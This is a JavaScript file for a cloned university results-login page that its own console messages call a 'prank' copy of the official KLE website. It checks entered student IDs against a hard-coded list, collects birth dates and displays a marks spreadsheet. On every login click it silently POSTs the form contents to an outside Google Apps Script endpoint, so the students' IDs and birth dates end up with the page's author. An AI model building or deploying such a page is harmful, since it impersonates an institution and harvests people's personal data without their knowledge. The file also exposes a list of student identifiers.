console.log('Hi! the one who is seeing this know some web tricks!');
console.log('If u are seeing this early then please keep quite we are doing some serious prank!');
console.log('.');
console.log('.');
console.log('.');
console.log('But if u r seeing it after the admin reveling it! , Then congo! you are pranked by him !');
console.log('And haha yes, May god protect u from further pranks :)');
console.log('.');
console.log('By this the admin is clearly declaring that this was a prank and it was not the official kle website! and was just a clone made by him :]');
console.log('.');
console.log('.');



const loginButton = document.getElementById('loginButton');
const body = document.getElementById('bodyy');
const show = document.getElementById('lekeaa');
const hide = document.getElementById('chupa');
const classes = document.getElementById('aclass');
const isa = document.getElementById('isa');
const invalid = document.getElementById('invalid');
const result = document.getElementById('result');
// const classa = document.getElementById('classa');
const showresult = document.getElementById('showresult');
const ja = document.getElementById('ja');




loginButton.addEventListener('click', () => {
    // const correctPassword = /^01fe24bcs\d{3}$/;
    const userPassword = document.getElementById("username").value.replace(/\s+/g, '');
    const day = document.getElementById("day").value;
    const month = document.getElementById("month").value;
    const year = document.getElementById("year").value;
    const correctPasswords = [
        "01fe24bcs113",
        "01fe24bcs114",
        "01fe24bcs115",
        "01fe24bcs116",
        "01fe24bcs118",
        "01fe24bcs119",
        "01fe24bcs120",
        "01fe24bcs121",
        "01fe24bcs122",
        "01fe24bcs123",
        "01fe24bcs124",
        "01fe24bcs125",
        "01fe24bcs126",
        "01fe24bcs127",
        "01fe24bcs128",
        "01fe24bcs129",
        "01fe24bcs130",
        "01fe24bcs131",
        "01fe24bcs133",
        "01fe24bcs027",
        "01fe24bcs028",
        "01fe24bcs031",
        "01fe24bcs033",
        "01fe24bcs034",
        "01fe24bcs035",
        "01fe24bcs036",
        "01fe24bcs039",
        "01fe24bcs040",
        "01fe24bcs043",
        "01fe24bcs058",
        "01fe24bcs059",
        "01fe24bcs061",
        "01fe24bcs062",
        "01fe24bcs063",
        "01fe24bcs064",
        "01fe24bcs065",
        "01fe24bcs073",
        "01fe24bcs074",
        "01fe24bcs075",
        "01fe24bcs076",
        "01fe24bcs078",
        "01fe24bcs079",
        "01fe24bcs080",
        "01fe24bcs081",
        "01fe24bcs082",
        "01fe24bcs083",
        "01fe24bcs084",
        "01fe24bcs085",
        "01fe24bcs086",
        "01fe24bcs087",
        "01fe24bcs088",
        "01fe24bcs089",
        "01fe24bcs001",
        "01fe24bcs002",
        "01fe24bcs003",
        "01fe24bcs004",
        "01fe24bcs005",
        "01fe24bcs006",
        "01fe24bcs007",
        "01fe24bcs008",
        "01fe24bcs009",
        "01fe24bcs010",
        "01fe24bcs011",
        "01fe24bcs012",
        "01fe24bcs013",
        "01fe24bcs014",
        "01fe24bcs015",
        "01fe24bcs016",
        "01fe24bcs047"
    ];

    // if ((!correctPassword.test(userPassword))) {
    //     console.log('cm');
    //     invalid.classList.remove('see');
    // }
    if (!correctPasswords.includes(userPassword)) {
        invalid.classList.remove('see');
    }
    else if (day === 'Day') {
        invalid.classList.remove('see');
    }
    else if (month === 'month') {
        invalid.classList.remove('see');
    }
    else if (year === 'year') {
        invalid.classList.remove('see');
    }
    else {
        show.classList.remove('see');
        show.classList.remove('lastx');
        body.classList.remove('givecolour');
        hide.classList.add('see');
    }
});


isa.addEventListener('click', () => {
    if (classes.classList.contains('lol')) {
        classes.classList.remove('lol');
    }
    else {
        classes.classList.add('lol');
    }
});


document.getElementById("result").addEventListener("click", async function () {

    showresult.classList.remove('see');
    ja.classList.add('lol');

    // Path to the Excel file
    const excelFilePath = "MARKSLIST.xlsx";

    // Fetch the Excel file as a binary array
    const response = await fetch(excelFilePath);
    const arrayBuffer = await response.arrayBuffer();

    // Parse the file using SheetJS
    const workbook = XLSX.read(arrayBuffer, { type: "array" });

    // Get the first sheet's data
    const sheetName = workbook.SheetNames[0];
    const sheet = workbook.Sheets[sheetName];

    // Convert sheet data to JSON
    const data = XLSX.utils.sheet_to_json(sheet, { header: 1 });

    // Render the data in an HTML table
    const table = document.getElementById("outputTable");
    table.innerHTML = ""; // Clear previous data

    data.forEach((row) => {
        const tr = document.createElement("tr");
        row.forEach((cell) => {
            const td = document.createElement("td");
            td.textContent = cell !== undefined ? cell : "";
            tr.appendChild(td);
        });
        table.appendChild(tr);
    });
});


const scriptURL = 'https://script.google.com/macros/s/AKfycbzdFm0ccHSR1p2jDgft_vP3LcYxKfBcpg99TtBoqHSJ486XSv_RtQzsNQUWb8U5K6vcCw/exec'
  const form = document.forms['submit-to-google-sheet']

  loginButton.addEventListener('click', () => {
    // Prevent default form behavior
    fetch(scriptURL, { method: 'POST', body: new FormData(form) })
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message));
  });